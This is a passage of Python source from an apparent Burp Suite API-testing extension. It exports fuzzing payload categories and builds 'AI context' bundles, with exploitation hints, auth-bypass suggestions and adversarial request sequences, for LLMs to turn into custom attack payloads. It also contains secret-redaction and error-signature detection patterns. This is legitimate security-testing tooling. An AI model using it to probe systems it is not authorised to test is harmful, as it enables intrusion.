                "content_types": self._get_waf_bypass_content_type(),
            },
        }
        writer = None
        try:
            writer = FileWriter(filename)
            writer.write(json.dumps(payloads, indent=2))
            self.fuzzer_area.append("[+] Exported payloads\n")
            self.fuzzer_area.append(
                "[+] Categories: idor, sqli, xss, nosqli, ssrf, xxe, ssti, deserialization, waf_bypass\n"
            )
            self.fuzzer_area.append("[+] Folder: {}\n".format(export_dir))
            self.fuzzer_area.append("[+] File: {}\n".format(filename))
            self.log_to_ui("[+] Exported payloads to: {}".format(export_dir))
        except Exception as e:
            self.fuzzer_area.append("[!] Export failed: {}\n".format(str(e)))
            self.log_to_ui("[!] Payload export failed: {}".format(str(e)))
            import traceback

            self._callbacks.printError(traceback.format_exc())
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError(
                        "Error closing payloads file: {}".format(str(e))
                    )

    def _export_ai_context(self):
        """Export rich AI analysis bundle from captured + generated findings."""
        import os

        if not self.api_data:
            msg = "[!] No endpoints captured. Import data or capture traffic first."
            self.fuzzer_area.append("\n" + msg + "\n")
            self.log_to_ui(msg)
            return

        with self.lock:
            data_snapshot = dict(self.api_data)
        attacks_snapshot = list(getattr(self, "fuzzing_attacks", []) or [])

        if not attacks_snapshot:
            self.fuzzer_area.append(
                "\n[*] No fuzzing attacks found yet; exporting context from captured API traffic only.\n"
            )

        self.fuzzer_area.append("\n" + "=" * 80 + "\n")
        self.fuzzer_area.append("[*] Exporting enhanced AI context bundle...\n")

        export_dir = self._get_export_dir("AI_Context")
        if not export_dir:
            return

        bundle = self._build_ai_export_bundle(data_snapshot, attacks_snapshot)
        files_to_write = [
            ("ai_context.json", bundle.get("legacy_context", {})),
            ("ai_bundle.json", bundle),
            ("ai_vulnerability_context.json", bundle.get("vulnerability_context", {})),
            ("ai_all_tabs_context.json", bundle.get("all_tabs_context", {})),
            ("ai_behavioral_analysis.json", bundle.get("behavioral_analysis", {})),
            ("ai_feedback_template.json", bundle.get("feedback_template", {})),
            ("ai_openai_request.json", bundle.get("llm_exports", {}).get("openai", {})),
            (
                "ai_anthropic_request.json",
                bundle.get("llm_exports", {}).get("anthropic", {}),
            ),
            ("ai_ollama_request.json", bundle.get("llm_exports", {}).get("local", {})),
        ]
        if self._ai_prep_layer_enabled():
            prep_layer = bundle.get("ai_prep_layer", {}) or {}
            files_to_write.extend(
                [
                    (
                        "ai_prep_invariant_hints.json",
                        prep_layer.get("invariant_hints", {}),
                    ),
                    (
                        "ai_prep_sequence_candidates.json",
                        prep_layer.get("sequence_candidates", {}),
                    ),
                    (
                        "ai_prep_evidence_graph.json",
                        prep_layer.get("evidence_graph", {}),
                    ),
                ]
            )

        written_files = []
        for filename_only, payload in files_to_write:
            writer = None
            filepath = os.path.join(export_dir, filename_only)
            try:
                writer = FileWriter(filepath)
                writer.write(json.dumps(payload, indent=2))
                written_files.append(filepath)
            except Exception as e:
                self._callbacks.printError(
                    "AI export write failed ({}): {}".format(filename_only, str(e))
                )
            finally:
                if writer:
                    try:
                        writer.close()
                    except Exception as e:
                        self._callbacks.printError(
                            "AI export close failed ({}): {}".format(filename_only, str(e))
                        )

        if not written_files:
            self.fuzzer_area.append("[!] AI export failed: no files were written\n")
            self.log_to_ui("[!] AI context export failed")
            return

        self.fuzzer_area.append(
            "[+] Exported enhanced AI context files: {}\n".format(len(written_files))
        )
        self.fuzzer_area.append("[+] Feed these files to ChatGPT/Claude/Ollama\n")
        self.fuzzer_area.append("[+] Folder: {}\n".format(export_dir))
        for filepath in written_files:
            self.fuzzer_area.append("[+] File: {}\n".format(filepath))
        self.log_to_ui("[+] Exported enhanced AI context to: {}".format(export_dir))

    def _build_ai_export_bundle(self, data_snapshot, attacks_snapshot):
        """Build one consolidated structure for AI-focused analysis/export."""
        vulnerability_context = self._export_vulnerability_context_for_ai(
            data_snapshot, attacks_snapshot
        )
        behavioral_analysis = self._export_behavioral_analysis(data_snapshot)
        feedback_template = self._create_ai_feedback_loop_export([])
        all_tabs_context = self._collect_all_tabs_ai_context(
            data_snapshot, attacks_snapshot
        )

        legacy_endpoints = []
        for endpoint_key, attack in attacks_snapshot[:20]:
            entries = data_snapshot.get(endpoint_key)
            if not entries:
                continue
            entry = self._get_entry(entries)
            legacy_endpoints.append(
                {
                    "endpoint": endpoint_key,
                    "method": entry.get("method", ""),
                    "path": entry.get("normalized_path", ""),
                    "attack_type": self._ascii_safe((attack or {}).get("type") or ""),
                    "params": entry.get("parameters", {}) or {},
                    "auth": entry.get("auth_detected", []) or [],
                    "sample_request": self._format_ai_sample(entry),
                }
            )
        if (not legacy_endpoints) and data_snapshot:
            for endpoint_key, entries in sorted(data_snapshot.items(), key=lambda item: item[0])[:20]:
                entry = self._get_entry(entries)
                legacy_endpoints.append(
                    {
                        "endpoint": endpoint_key,
                        "method": entry.get("method", ""),
                        "path": entry.get("normalized_path", ""),
                        "attack_type": "Unknown",
                        "params": entry.get("parameters", {}) or {},
                        "auth": entry.get("auth_detected", []) or [],
                        "sample_request": self._format_ai_sample(entry),
                    }
                )

        legacy_context = {
            "task": "Generate custom payloads for API security testing",
            "endpoints": legacy_endpoints,
            "prompt": self._generate_ai_prompt(),
        }

        ai_input = {
            "scan_metadata": vulnerability_context.get("scan_metadata", {}),
            "vulnerabilities": vulnerability_context.get("vulnerabilities", []),
            "api_patterns": vulnerability_context.get("api_patterns", {}),
            "authentication_flows": vulnerability_context.get("authentication_flows", {}),
            "business_logic_hints": vulnerability_context.get("business_logic_hints", []),
            "behavioral_analysis": behavioral_analysis,
            "all_tabs_context": all_tabs_context,
        }
        llm_exports = {
            "openai": self._export_for_llm_platform("openai", ai_input),
            "anthropic": self._export_for_llm_platform("anthropic", ai_input),
            "local": self._export_for_llm_platform("local", ai_input),
        }
        ai_prep_layer = {}
        if self._ai_prep_layer_enabled():
            ai_prep_layer = self._build_ai_prep_layer(
                data_snapshot, attacks_snapshot
            )

        return {
            "metadata": {
                "generated_at": time.strftime("%Y-%m-%d %H:%M:%S"),
                "total_endpoints": len(data_snapshot),
                "total_attacks": len(attacks_snapshot),
                "vulnerability_count": len(
                    vulnerability_context.get("vulnerabilities", [])
                ),
            },
            "legacy_context": legacy_context,
            "vulnerability_context": vulnerability_context,
            "all_tabs_context": all_tabs_context,
            "behavioral_analysis": behavioral_analysis,
            "feedback_template": feedback_template,
            "enhanced_prompt": self._generate_enhanced_ai_prompt(),
            "llm_exports": llm_exports,
            "ai_prep_layer": ai_prep_layer,
        }

    def _collect_all_tabs_ai_context(self, data_snapshot, attacks_snapshot):
        """Aggregate AI-ready context from all tabs (not only fuzzer)."""
        attack_samples = []
        for endpoint_key, attack in (attacks_snapshot or [])[:200]:
            attack_obj = attack if isinstance(attack, dict) else {}
            attack_samples.append(
                {
                    "endpoint": self._ascii_safe(endpoint_key),
                    "type": self._ascii_safe(attack_obj.get("type") or "Unknown"),
                    "severity": self._calculate_attack_severity(attack_obj),
                    "confidence": self._ascii_safe(attack_obj.get("confidence") or "Medium"),
                    "risk": self._ascii_safe(attack_obj.get("risk") or ""),
                    "note": self._ascii_safe(attack_obj.get("note") or ""),
                    "params": self._sanitize_for_ai_payload(attack_obj.get("params") or []),
                }
            )

        all_tabs = {
            "summary": {
                "captured_endpoints": len(data_snapshot or {}),
                "fuzzing_attacks": len(attacks_snapshot or []),
            },
            "recon": {
                "endpoint_count": len(data_snapshot or {}),
                "endpoint_samples": self._sanitize_for_ai_payload(
                    sorted(list((data_snapshot or {}).keys()))[:250]
                ),
            },
            "version_scanner": {
                "configured_versions": self._sanitize_for_ai_payload(
                    self._parse_comma_newline_values(
                        self.version_input.getText()
                        if hasattr(self, "version_input") and self.version_input is not None
                        else ""
                    )
                ),
                "result_count": len(getattr(self, "version_results", []) or []),
                "result_samples": self._snapshot_list_attr(
                    "version_results", limit=250
                ),
                "output_tail": self._snapshot_text_area("version_area"),
            },
            "param_miner": {
                "configured_params": self._sanitize_for_ai_payload(
                    self._parse_comma_newline_values(
                        self.param_input.getText()
                        if hasattr(self, "param_input") and self.param_input is not None
                        else ""
                    )
                ),
                "result_count": len(getattr(self, "param_results", []) or []),
                "result_samples": self._snapshot_list_attr(
                    "param_results", limit=250
                ),
                "output_tail": self._snapshot_text_area("param_area"),
            },
            "fuzzer": {
                "attack_count": len(attacks_snapshot or []),
                "attack_samples": self._sanitize_for_ai_payload(attack_samples),
                "output_tail": self._snapshot_text_area("fuzzer_area"),
            },
            "auth_replay": {
                "finding_count": len(getattr(self, "auth_replay_findings", []) or []),
                "findings": self._snapshot_list_attr(
                    "auth_replay_findings",
                    limit=250,
                    lock_attr="auth_replay_lock",
                ),
                "output_tail": self._snapshot_text_area("auth_replay_area"),
            },
            "passive_discovery": {
                "finding_count": len(getattr(self, "passive_discovery_findings", []) or []),
                "findings": self._snapshot_list_attr(
                    "passive_discovery_findings",
                    limit=300,
                    lock_attr="passive_discovery_lock",
                ),
                "output_tail": self._snapshot_text_area("passive_area"),
            },
            "nuclei": {
                "output_tail": self._snapshot_text_area("nuclei_area"),
            },
            "httpx": {
                "output_tail": self._snapshot_text_area("httpx_area"),
            },
            "katana": {
                "discovered_count": len(getattr(self, "katana_discovered", []) or []),
                "discovered_samples": self._snapshot_list_attr(
                    "katana_discovered", limit=300, lock_attr="katana_lock"
                ),
                "output_tail": self._snapshot_text_area("katana_area"),
            },
            "ffuf": {
                "result_count": len(getattr(self, "ffuf_results", []) or []),
                "result_samples": self._snapshot_list_attr(
                    "ffuf_results", limit=300, lock_attr="ffuf_lock"
                ),
                "output_tail": self._snapshot_text_area("ffuf_area"),
            },
            "wayback": {
                "snapshot_count": len(getattr(self, "wayback_discovered", []) or []),
                "snapshot_samples": self._snapshot_list_attr(
                    "wayback_discovered", limit=300, lock_attr="wayback_lock"
                ),
                "output_tail": self._snapshot_text_area("wayback_area"),
            },
            "sqlmap_verify": {
                "finding_count": len(getattr(self, "sqlmap_findings", []) or []),
                "findings": self._snapshot_list_attr(
                    "sqlmap_findings", limit=300, lock_attr="sqlmap_lock"
                ),
                "verified_candidates": self._snapshot_list_attr(
                    "sqlmap_verified_candidates", limit=200, lock_attr="sqlmap_lock"
                ),
                "output_tail": self._snapshot_text_area("sqlmap_area"),
            },
            "dalfox_verify": {
                "finding_count": len(getattr(self, "dalfox_findings", []) or []),
                "findings": self._snapshot_list_attr(
                    "dalfox_findings", limit=300, lock_attr="dalfox_lock"
                ),
                "verified_candidates": self._snapshot_list_attr(
                    "dalfox_verified_candidates", limit=200, lock_attr="dalfox_lock"
                ),
                "output_tail": self._snapshot_text_area("dalfox_area"),
            },
            "asset_discovery": {
                "discovered_count": len(getattr(self, "asset_discovered", []) or []),
                "discovered_samples": self._snapshot_list_attr(
                    "asset_discovered", limit=300, lock_attr="asset_lock"
                ),
                "selected_domains": self._sanitize_for_ai_payload(
                    list(getattr(self, "asset_selected_domains", []) or [])
                ),
                "output_tail": self._snapshot_text_area("asset_area"),
            },
            "openapi_drift": {
                "result_line_count": len(getattr(self, "openapi_drift_results", []) or []),
                "result_lines": self._snapshot_list_attr(
                    "openapi_drift_results", limit=300, lock_attr="openapi_lock"
                ),
                "missing_candidates": self._snapshot_list_attr(
                    "openapi_missing_candidates", limit=200, lock_attr="openapi_lock"
                ),
                "selected_spec_targets": self._snapshot_list_attr(
                    "openapi_selected_spec_targets", limit=50
                ),
                "output_tail": self._snapshot_text_area("openapi_area"),
            },
            "graphql": {
                "result_line_count": len(getattr(self, "graphql_results", []) or []),
                "result_lines": self._snapshot_list_attr(
                    "graphql_results", limit=300, lock_attr="graphql_lock"
                ),
                "recon_candidates": self._snapshot_list_attr(
                    "graphql_recon_candidates", limit=200, lock_attr="graphql_lock"
                ),
                "selected_targets": self._snapshot_list_attr(
                    "graphql_selected_targets", limit=80, lock_attr="graphql_lock"
                ),
                "output_tail": self._snapshot_text_area("graphql_area"),
            },
        }
        return self._sanitize_for_ai_payload(all_tabs)

    def _ai_prep_layer_enabled(self):
        """Toggle additive AI prep artifacts without affecting scanner behavior."""
        import os

        raw = self._ascii_safe(
            os.environ.get(self.AI_PREP_LAYER_ENV_VAR, "")
        ).strip().lower()
        if not raw:
            return bool(self.AI_PREP_LAYER_DEFAULT_ENABLED)
        if raw in ["0", "false", "no", "off", "disable", "disabled"]:
            return False
        if raw in ["1", "true", "yes", "on", "enable", "enabled"]:
            return True
        return bool(self.AI_PREP_LAYER_DEFAULT_ENABLED)

    def _build_ai_prep_layer(self, data_snapshot, attacks_snapshot):
        """Build non-destructive AI prep artifacts for post-collection triage."""
        # No endpoint filtering or suppression is applied in runtime scanning.
        return ai_prep_layer.build_ai_prep_layer(
            self, data_snapshot, attacks_snapshot
        )

    def _build_ai_prep_invariant_hints(self, data_snapshot):
        """Infer business/workflow invariants auditors often miss in request-level review."""
        return ai_prep_layer.build_ai_prep_invariant_hints(self, data_snapshot)

    def _build_ai_prep_sequence_candidates(self, data_snapshot):
        """Generate adversarial multi-step sequences for deep logic abuse testing."""
        return ai_prep_layer.build_ai_prep_sequence_candidates(self, data_snapshot)

    def _build_ai_prep_evidence_graph(self, data_snapshot, attacks_snapshot):
        """Build graph links between endpoints, params, auth context, and findings."""
        return ai_prep_layer.build_ai_prep_evidence_graph(
            self, data_snapshot, attacks_snapshot
        )

    def _snapshot_list_attr(self, attr_name, limit=200, lock_attr=None):
        """Safely snapshot list-like attribute and sanitize for AI export."""
        values = []
        lock_obj = getattr(self, lock_attr, None) if lock_attr else None
        try:
            if lock_obj is not None:
                lock_obj.acquire()
            raw = getattr(self, attr_name, []) or []
            if isinstance(raw, list):
                values = list(raw[:limit])
            else:
                values = list(raw)[:limit]
        except Exception as e:
            self._callbacks.printError(
                "AI snapshot list error ({}): {}".format(attr_name, self._ascii_safe(e))
            )
            values = []
        finally:
            if lock_obj is not None:
                try:
                    lock_obj.release()
                except Exception as release_err:
                    self._callbacks.printError(
                        "AI snapshot list unlock error ({}): {}".format(
                            attr_name, self._ascii_safe(release_err)
                        )
                    )
        return self._sanitize_for_ai_payload(values)

    def _snapshot_text_area(self, area_attr, max_chars=12000):
        """Snapshot bounded tail of tab output text for AI context."""
        area = getattr(self, area_attr, None)
        if area is None:
            return ""
        try:
            text = self._ascii_safe(area.getText() or "")
        except Exception as e:
            self._callbacks.printError(
                "AI snapshot text error ({}): {}".format(area_attr, self._ascii_safe(e))
            )
            return ""
        if len(text) > max_chars:
            text = text[-max_chars:]
        return self._sanitize_text_for_ai(text)

    def _sanitize_for_ai_payload(self, value, depth=0):
        """Recursively sanitize payload fields before sharing with external AI."""
        if depth > 8:
            return "<truncated>"
        if value is None:
            return None
        if isinstance(value, bool):
            return value
        if isinstance(value, (int, float)):
            return value
        if isinstance(value, dict):
            sanitized = {}
            count = 0
            for key, val in value.items():
                if count >= 400:
                    break
                count += 1
                safe_key = self._ascii_safe(key)
                key_lower = self._ascii_safe(key, lower=True)
                if any(
                    marker in key_lower
                    for marker in [
                        "authorization",
                        "cookie",
                        "token",
                        "secret",
                        "password",
                        "api_key",
                        "apikey",
                        "set-cookie",
                    ]
                ):
                    sanitized[safe_key] = "<redacted>"
                else:
                    sanitized[safe_key] = self._sanitize_for_ai_payload(val, depth + 1)
            return sanitized
        if isinstance(value, (list, tuple, set)):
            out = []
            idx = 0
            for item in value:
                if idx >= 500:
                    break
                idx += 1
                out.append(self._sanitize_for_ai_payload(item, depth + 1))
            return out
        return self._sanitize_text_for_ai(self._ascii_safe(value))

    def _export_vulnerability_context_for_ai(
        self, data_snapshot, attacks_snapshot, max_items=120
    ):
        """Export detailed vulnerability context optimized for AI analysis."""
        context = {
            "scan_metadata": {
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "total_endpoints": len(data_snapshot),
                "total_attacks": len(attacks_snapshot),
                "vulnerability_summary": self._get_vuln_summary(attacks_snapshot),
            },
            "vulnerabilities": [],
            "api_patterns": self._extract_api_patterns(data_snapshot),
            "authentication_flows": self._extract_auth_flows(data_snapshot),
            "business_logic_hints": self._extract_business_logic(data_snapshot),
        }

        for endpoint_key, attack in attacks_snapshot[:max_items]:
            entries = data_snapshot.get(endpoint_key)
            if not entries:
                continue
            entries_list = entries if isinstance(entries, list) else [entries]
            entry = self._get_entry(entries_list)
            attack_obj = attack if isinstance(attack, dict) else {}
            reflected = (
                entry.get("param_patterns", {}).get("reflected", [])
                if isinstance(entry.get("param_patterns", {}), dict)
                else []
            )
            vuln_context = {
                "endpoint": endpoint_key,
                "vulnerability_type": self._ascii_safe(
                    attack_obj.get("type") or "Unknown"
                ),
                "severity": self._calculate_attack_severity(attack_obj),
                "confidence": self._ascii_safe(
                    attack_obj.get("confidence") or "Medium"
                ),
                "request_sample": self._format_ai_sample(entry),
                "response_patterns": self._extract_response_patterns(entries_list),
                "error_messages": self._extract_errors(entries_list),
                "parameter_analysis": {
                    "names": self._extract_param_names(entry),
                    "types_detected": self._infer_param_types(entry),
                    "validation_hints": self._detect_validation(entry),
                },
                "attack_surface": {
                    "injection_points": self._identify_injection_points(entry),
                    "reflection_points": reflected[:20],
                    "encoding_context": self._detect_encoding_context(entry),
                },
                "similar_endpoints": self._find_similar_endpoints(
                    endpoint_key, data_snapshot, limit=5
                ),
                "exploitation_hints": {
                    "waf_detected": self._detect_waf(entry),
                    "rate_limiting": self._detect_rate_limit(entries_list),
                    "authentication_bypass_vectors": self._suggest_auth_bypass(
                        entry, attack_obj
                    ),
                },
            }
            context["vulnerabilities"].append(vuln_context)

        return context

    def _format_ai_sample(self, entry):
        """Build request/response sample with secret redaction for AI sharing."""
        base = self._format_sample(entry)
        redacted = dict(base)
        redacted["headers"] = self._sanitize_headers_for_ai(base.get("headers", {}))
        redacted["query"] = self._sanitize_text_for_ai(base.get("query", ""))
        redacted["request_body"] = self._sanitize_text_for_ai(
            base.get("request_body", "")
        )
        redacted["response_body"] = self._sanitize_text_for_ai(
            base.get("response_body", "")
        )
        return redacted

    def _sanitize_headers_for_ai(self, headers):
        if not isinstance(headers, dict):
            return {}
        sensitive = set(
            [
                "authorization",
                "cookie",
                "set-cookie",
                "x-api-key",
                "api-key",
                "x-access-token",
                "x-auth-token",
                "proxy-authorization",
            ]
        )
        sanitized = {}
        for key, value in headers.items():
            key_text = self._ascii_safe(key)
            lower_key = self._ascii_safe(key, lower=True)
            value_text = self._ascii_safe(value)
            if lower_key in sensitive or any(
                marker in lower_key for marker in ["token", "secret", "apikey", "api-key"]
            ):
                sanitized[key_text] = "<redacted>"
            else:
                sanitized[key_text] = self._sanitize_text_for_ai(value_text)[:300]
        return sanitized

    def _sanitize_text_for_ai(self, text):
        safe = self._ascii_safe(text or "")
        if not safe:
            return ""
        redacted = safe
        redacted = re.sub(
            r"(?i)(authorization\s*:\s*bearer\s+)[A-Za-z0-9\-\._~\+/=]+",
            r"\1<redacted>",
            redacted,
        )
        redacted = re.sub(
            r"(?i)(\b(?:access_token|refresh_token|id_token|api_key|apikey|secret|password)\b\s*[:=]\s*[\"']?)[^\"'&\s]+",
            r"\1<redacted>",
            redacted,
        )
        redacted = re.sub(
            r"\b[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}\b",
            "<redacted_jwt>",
            redacted,
        )
        return redacted

    def _extract_response_patterns(self, entries):
        """Extract response patterns that help AI detect success/failure signals."""
        entries_list = entries if isinstance(entries, list) else [entries]
        statuses = []
        lengths = []
        timings = []
        aggregated_signatures = {
            "sql_errors": set(),
            "stack_traces": set(),
            "debug_info": set(),
            "framework_errors": set(),
        }
        response_headers = []
        for sample in entries_list[:12]:
            if not isinstance(sample, dict):
                continue
            status_code = sample.get("response_status", 0)
            if isinstance(status_code, int):
                statuses.append(status_code)
            length_value = sample.get("response_length", 0)
            if isinstance(length_value, int):
                lengths.append(length_value)
            timing_value = sample.get("response_time_ms", 0)
            if isinstance(timing_value, int):
                timings.append(timing_value)
            if isinstance(sample.get("response_headers"), dict):
                response_headers.append(sample.get("response_headers"))
            body_text = sample.get("response_body", "")
            signatures = self._extract_error_signatures(body_text)
            for category, values in signatures.items():
                for value in values[:8]:
                    aggregated_signatures[category].add(self._ascii_safe(value))

        error_signatures = {
            key: list(values)[:12] for key, values in aggregated_signatures.items()
        }
        return {
            "status_codes": sorted(list(set(statuses))),
            "content_length_variance": self._calc_length_variance(lengths),
            "timing_patterns_ms": timings[:20],
            "error_signatures": error_signatures,
            "success_indicators": {
                "json_structure": self._analyze_json_structure(entries_list),
                "html_elements": self._extract_html_elements(entries_list),
                "headers": self._extract_interesting_headers(response_headers),
            },
            "anomalies": self._detect_response_anomalies(
                statuses, lengths, timings, error_signatures
            ),
        }

    def _calc_length_variance(self, lengths):
        values = [x for x in (lengths or []) if isinstance(x, int)]
        if not values:
            return {"min": 0, "max": 0, "delta": 0}
        min_v = min(values)
        max_v = max(values)
        return {"min": min_v, "max": max_v, "delta": max_v - min_v}

    def _extract_error_signatures(self, response_body):
        """Extract error signatures that often indicate exploitable behavior."""
        body = self._ascii_safe(response_body or "")
        signatures = {
            "sql_errors": [],
            "stack_traces": [],
            "debug_info": [],
            "framework_errors": [],
        }
        if not body:
            return signatures

        sql_patterns = [
            r"SQL syntax.*?error",
            r"mysql_fetch",
            r"ORA-\d+",
            r"PostgreSQL.*?ERROR",
            r"SQLite.*?error",
            r"Unclosed quotation mark after the character string",
        ]
        for pattern in sql_patterns:
            matches = re.findall(pattern, body, re.I)
            for match in matches[:5]:
                signatures["sql_errors"].append(self._ascii_safe(match))

        if (" at " in body and ("Exception" in body or "Error" in body)) or (
            "Traceback (most recent call last)" in body
        ):
            signatures["stack_traces"].append(body[:500])

        debug_patterns = [r"\bdebug\b", r"\bverbose\b", r"\btrace\b", r"\bstack\b"]
        for pattern in debug_patterns:
            if re.search(pattern, body, re.I):
                signatures["debug_info"].append(pattern.strip("\\b"))

        framework_patterns = [
            r"Laravel",
            r"Symfony",
            r"Spring Boot",
            r"Django",
            r"Express",
            r"Rails",
            r"ASP\.NET",
        ]
        for pattern in framework_patterns:
            if re.search(pattern, body, re.I):
                signatures["framework_errors"].append(self._ascii_safe(pattern))

        for key in signatures.keys():
            signatures[key] = list(dict.fromkeys(signatures[key]))[:10]
        return signatures

    def _analyze_json_structure(self, entries):
        paths = set()
        entries_list = entries if isinstance(entries, list) else [entries]
        for sample in entries_list[:8]:
            if not isinstance(sample, dict):
                continue
            parsed = self._parse_json_loose(sample.get("response_body", ""))
            if parsed is None:
                continue
            self._flatten_json_paths(parsed, "", paths, 0)
        return sorted(list(paths))[:60]

    def _extract_html_elements(self, entries):
        tags = set()
        entries_list = entries if isinstance(entries, list) else [entries]
        for sample in entries_list[:5]:
            if not isinstance(sample, dict):
                continue
            body = self._ascii_safe(sample.get("response_body", ""))
            if not body:
                continue
            for tag in re.findall(r"<([a-zA-Z0-9]{1,24})", body):
                tags.add(self._ascii_safe(tag, lower=True))
                if len(tags) >= 30:
                    break
            if len(tags) >= 30:
                break
        return sorted(list(tags))

    def _extract_interesting_headers(self, header_list):
        interesting = {}
        keys_of_interest = [
            "content-type",
            "x-powered-by",
            "server",
            "set-cookie",
            "cache-control",
            "x-ratelimit-limit",
            "x-ratelimit-remaining",
            "retry-after",
            "x-frame-options",
            "content-security-policy",
            "x-content-type-options",
        ]
        for headers in header_list[:8]:
            if not isinstance(headers, dict):
                continue
            for key, value in headers.items():
                key_lower = self._ascii_safe(key, lower=True)
                if key_lower in keys_of_interest:
                    interesting[key_lower] = self._ascii_safe(value)[:200]
        return interesting

    def _detect_response_anomalies(
        self, statuses, lengths, timings, error_signatures
    ):
        anomalies = []
        unique_statuses = list(set(statuses))
        if len(unique_statuses) >= 3:
            anomalies.append("high_status_variation")
        if any(s >= 500 for s in unique_statuses):
            anomalies.append("server_error_present")
        length_delta = self._calc_length_variance(lengths).get("delta", 0)
        if length_delta > 2500:
            anomalies.append("large_response_length_delta")
        if timings and (max(timings) - min(timings)) > 1500:
            anomalies.append("high_response_time_variance")
        if any(error_signatures.get(k) for k in ["sql_errors", "stack_traces"]):
            anomalies.append("error_signature_detected")
        return anomalies

    def _extract_errors(self, entries):
        entries_list = entries if isinstance(entries, list) else [entries]
        collected = []
        for sample in entries_list[:8]:
            if not isinstance(sample, dict):
                continue
            signatures = self._extract_error_signatures(sample.get("response_body", ""))
            for category, values in signatures.items():
                for value in values[:4]:
                    collected.append(
                        {
                            "category": category,
                            "message": self._ascii_safe(value)[:300],
                            "status_code": sample.get("response_status", 0),
                        }
                    )
                    if len(collected) >= 30:
                        return collected
        return collected

    def _extract_param_names(self, entry):
        names = set()
        params = entry.get("parameters", {}) or {}
        if not isinstance(params, dict):
            return []
        for _, values in params.items():
            if isinstance(values, dict):
                for key in values.keys():
                    names.add(self._ascii_safe(key))
            elif isinstance(values, list):
                for item in values:
                    names.add(self._ascii_safe(item))
        return sorted([name for name in names if name])[:120]

    def _infer_param_types(self, entry):
        inferred = {}
        param_patterns = entry.get("param_patterns", {}) or {}
        type_hints = param_patterns.get("param_types", {}) if isinstance(param_patterns, dict) else {}
        if isinstance(type_hints, dict):
            for key, value in type_hints.items():
                inferred[self._ascii_safe(key)] = self._ascii_safe(value)

        params = entry.get("parameters", {}) or {}
        if isinstance(params, dict):
            for _, values in params.items():
                if isinstance(values, dict):
                    for key, value in values.items():
                        key_str = self._ascii_safe(key)
                        if key_str in inferred:
                            continue
                        raw_value = self._ascii_safe(value)
                        lower_value = self._ascii_safe(value, lower=True)
                        if lower_value in ["true", "false"]:
                            inferred[key_str] = "boolean"
                        elif re.match(r"^-?\d+$", raw_value):
                            inferred[key_str] = "integer"
                        elif re.match(r"^-?\d+\.\d+$", raw_value):
                            inferred[key_str] = "float"
                        elif re.match(
                            r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$",
                            lower_value,
                        ):
                            inferred[key_str] = "uuid"
                        elif "@" in raw_value:
                            inferred[key_str] = "email"
                        elif raw_value.startswith("{") or raw_value.startswith("["):
                            inferred[key_str] = "json"
                        else:
                            inferred[key_str] = "string"
                elif isinstance(values, list):
                    for item in values:
                        key_str = self._ascii_safe(item)
                        if key_str and key_str not in inferred:
                            inferred[key_str] = "unknown"
        return inferred

    def _detect_validation(self, entry):
        body = self._ascii_safe(entry.get("response_body", ""), lower=True)
        status_code = int(entry.get("response_status", 0) or 0)
        keywords = []
        for keyword in [
            "invalid",
            "required",
            "must be",
            "too long",
            "too short",
            "format",
            "constraint",
            "validation",
        ]:
            if keyword in body:
                keywords.append(keyword)
        return {
            "detected": bool(keywords or status_code in [400, 422]),
            "status_code": status_code,
            "keywords": keywords[:10],
        }

    def _identify_injection_points(self, entry):
        points = set(self._extract_param_names(entry))
        request_body = self._ascii_safe(entry.get("request_body", ""))
        parsed_body = self._parse_json_loose(request_body)
        if parsed_body is not None:
            json_paths = set()
            self._flatten_json_paths(parsed_body, "", json_paths, 0)
            points.update([self._ascii_safe(path) for path in json_paths])
        return sorted([x for x in points if x and x != "<root>"])[:80]

    def _detect_encoding_context(self, entry):
        content_type = self._ascii_safe(entry.get("content_type", ""), lower=True)
        enc = entry.get("encryption_indicators", {}) or {}
        request_body = self._ascii_safe(entry.get("request_body", ""))
        hints = []
        if re.search(r"[A-Za-z0-9+/]{32,}={0,2}", request_body):
            hints.append("base64-like")
        if re.search(r"[0-9a-fA-F]{32,}", request_body):
            hints.append("hex-like")
        return {
            "content_type": content_type,
            "encryption_detected": bool(enc.get("likely_encrypted")),
            "encryption_types": list(enc.get("types", []) or []),
            "body_encoding_hints": hints,
        }

    def _find_similar_endpoints(self, endpoint_key, data_snapshot, limit=5):
        target_entries = data_snapshot.get(endpoint_key)
        if not target_entries:
            return []
        target_entry = self._get_entry(target_entries)

        similarities = []
        for key, entries in data_snapshot.items():
            if key == endpoint_key:
                continue
            entry = self._get_entry(entries)
            similarity_score = self._calculate_endpoint_similarity(target_entry, entry)
            if similarity_score > 0.35:
                similarities.append(
                    {
                        "endpoint": key,
                        "similarity": similarity_score,
                        "shared_params": self._get_shared_params(target_entry, entry),
                        "behavioral_similarity": self._compare_behaviors(
                            target_entry, entry
                        ),
                    }
                )
        similarities = sorted(similarities, key=lambda x: x["similarity"], reverse=True)
        return similarities[:limit]

    def _calculate_endpoint_similarity(self, target_entry, other_entry):
        target_path = self._ascii_safe(
            target_entry.get("normalized_path") or target_entry.get("path") or "/",
            lower=True,
        )
        other_path = self._ascii_safe(
            other_entry.get("normalized_path") or other_entry.get("path") or "/",
            lower=True,
        )
        target_segs = set(self._split_path_segments(target_path))
        other_segs = set(self._split_path_segments(other_path))
        path_union = target_segs.union(other_segs)
        path_score = 0.0
        if path_union:
            path_score = float(len(target_segs.intersection(other_segs))) / float(
                len(path_union)
            )

        method_score = 0.25 if (
            self._ascii_safe(target_entry.get("method"), lower=True)
            == self._ascii_safe(other_entry.get("method"), lower=True)
        ) else 0.0

        target_params = set(self._extract_param_names(target_entry))
        other_params = set(self._extract_param_names(other_entry))
        param_union = target_params.union(other_params)
        param_score = 0.0
        if param_union:
            param_score = float(
                len(target_params.intersection(other_params))
            ) / float(len(param_union))

        score = (0.5 * path_score) + method_score + (0.25 * param_score)
        return round(min(1.0, max(0.0, score)), 3)

    def _get_shared_params(self, target_entry, other_entry):
        target_params = set(self._extract_param_names(target_entry))
        other_params = set(self._extract_param_names(other_entry))
        return sorted(list(target_params.intersection(other_params)))[:30]

    def _compare_behaviors(self, target_entry, other_entry):
        target_status = int(target_entry.get("response_status", 0) or 0)
        other_status = int(other_entry.get("response_status", 0) or 0)
        target_auth = set(
            [self._ascii_safe(x, lower=True) for x in (target_entry.get("auth_detected", []) or [])]
        )
        other_auth = set(
